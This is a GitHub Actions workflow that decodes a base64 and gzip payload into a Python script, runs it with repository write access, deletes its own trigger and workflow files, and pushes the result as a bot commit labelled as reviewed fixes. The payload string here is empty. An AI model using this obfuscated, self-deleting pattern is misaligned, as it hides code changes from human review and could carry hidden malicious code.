name: Apply bug-fix round 2

on:
  push:
    branches:
      - fix/bug-fix-round-2
    paths:
      - .github/round2-trigger

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
        with:
          ref: fix/bug-fix-round-2
          fetch-depth: 0

      - name: Apply reviewed fixes
        run: |
          python3 - <<'PY'
          from pathlib import Path
          import base64
          import gzip
          payload = ''''''
          Path('/tmp/apply_bug_round_2.py').write_bytes(gzip.decompress(base64.b64decode(payload)))
          PY
          python3 /tmp/apply_bug_round_2.py

      - name: Commit source fixes
        run: |
          rm -f .github/round2-trigger .github/workflows/apply-bug-fix-round-2.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git diff --cached --check
          git commit -m "fix: resolve bug-audit round 2 findings"
          git push origin HEAD:fix/bug-fix-round-2
